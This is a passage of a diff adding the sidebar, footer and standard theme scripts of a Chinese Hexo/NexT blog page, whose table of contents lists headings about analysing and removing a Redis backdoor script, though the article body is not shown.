+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#缘起"><span class="nav-text">1. 缘起</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脚本分析"><span class="nav-text">2. 脚本分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#清除"><span class="nav-text">3. 清除</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis后门原理"><span class="nav-text">4. Redis后门原理</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="吴迪"
+      src="/images/avatar.jpg?raw=true">
+  <p class="site-author-name" itemprop="name">吴迪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://beian.miit.gov.cn/" rel="noopener" target="_blank">苏ICP备17000391号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">吴迪</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+
+  <script src='https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      var config = {
+        theme:'default',
+        logLevel:'fatal',
+        securityLevel:'strict',
+        startOnLoad:true,
+        arrowMarkerAbsolute:false,
+
+        er:{
+          diagramPadding:20,
+          layoutDirection:'TB',
+          minEntityWidth:100,
+          minEntityHeight:75,
+          entityPadding:15,
+          stroke:'gray',
+          fill:'honeydew',
+          fontSize:12,
+          useMaxWidth:true,
+        },
+        flowchart:{
+          diagramPadding:8,
+          htmlLabels:true,
+          curve:'linear',
+        },
+        sequence:{
+          diagramMarginX:50,
+          diagramMarginY:10,
+          actorMargin:50,
+          width:150,
+          height:65,
+          boxMargin:10,
+          boxTextMargin:5,
+          noteMargin:10,
+          messageMargin:35,
+          messageAlign:'center',
+          mirrorActors:true,
+          bottomMarginAdj:1,
+          useMaxWidth:true,
+          rightAngles:false,
+          showSequenceNumbers:false,
+        },
+        gantt:{
+          titleTopMargin:25,
+          barHeight:20,
+          barGap:4,
+          topPadding:50,
+          leftPadding:75,
+          gridLineStartPadding:35,
+          fontSize:11,
+          fontFamily:'"Open-Sans", "sans-serif"',
+          numberSectionStyles:4,
+          axisFormat:'%Y-%m-%d',
+        }
+      };
+      mermaid.initialize(config);
+    }
+  </script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
